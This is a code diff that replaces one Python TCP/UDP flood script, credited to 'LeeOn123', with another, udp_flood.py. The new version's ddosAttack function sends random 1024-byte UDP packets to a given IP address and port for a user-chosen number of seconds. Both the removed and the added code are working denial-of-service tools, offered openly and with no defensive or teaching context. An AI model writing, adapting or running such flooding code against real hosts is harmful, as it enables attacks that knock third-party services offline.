@@ -1,48 +1,48 @@
-#!/usr/bin/env python3
-#Code by LeeOn123
-import random
-import socket
-import threading
+import random, socket, threading, sys, time, getopt
 
-print("--> C0de By Lee0n123 <--")
-print("#-- TCP/UDP FLOOD --#")
-ip = str(input(" Host/Ip:"))
-port = int(input(" Port:"))
-choice = str(input(" UDP(y/n):"))
-times = int(input(" Packets per one connection:"))
-threads = int(input(" Threads:"))
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
+class UDP_packet:
+	def __init__(self, dest_ip, dest_port):
+		self.dest_ip = dest_ip
+		self.dest_port = dest_port
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(ip),int(port))
-			for x in range(times):
-				s.sendto(data,addr)
-			print(i +" Sent!!!")
+			self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 		except:
-			print("[!] Error!!!")
+			print('Make pakcet error!')
+			sys.exit(1)
 
-def run2():
-	data = random._urandom(16)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
+	def send_socket(self):
+		data = random._urandom(1024)
 		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((ip,port))
-			s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +" Sent!!!")
+			self.socket.sendto(data, (self.dest_ip, self.dest_port))
 		except:
-			s.close()
-			print("[*] Error")
+			print("Sending packet error!")
+			exit(1)
 
-for y in range(threads):
-	if choice == 'y':
-		th = threading.Thread(target = run)
-		th.start()
-	else:
-		th = threading.Thread(target = run2)
-		th.start()
+
+def ddosAttack(argv):
+    try :
+        opts, args = getopt.getopt(argv,"rs:",["random=,specific="])
+    except getopt.GetoptError:
+        print('udp_flood.py -r <DestinationIp> <DestinationPort>')
+        sys.exit(2)
+
+    try :
+        udp = UDP_packet(dest_ip=str(args[0]), dest_port=int(args[1]))
+    except :
+        print('udp_flood.py -r <DestinationIp> <DestinationPort>')
+        sys.exit(2)
+
+    end = input('How much seconds do you want?')
+    start = time.time()
+    end = start + float(end)
+
+    count = 0 #to check how many packet was maden
+
+    #do until time over
+    while time.time() < end:
+        udp.send_socket()
+        count += 1
+    print(str(count) + " packets are sent")
+
+if __name__ == "__main__":
+    ddosAttack(sys.argv[1:])
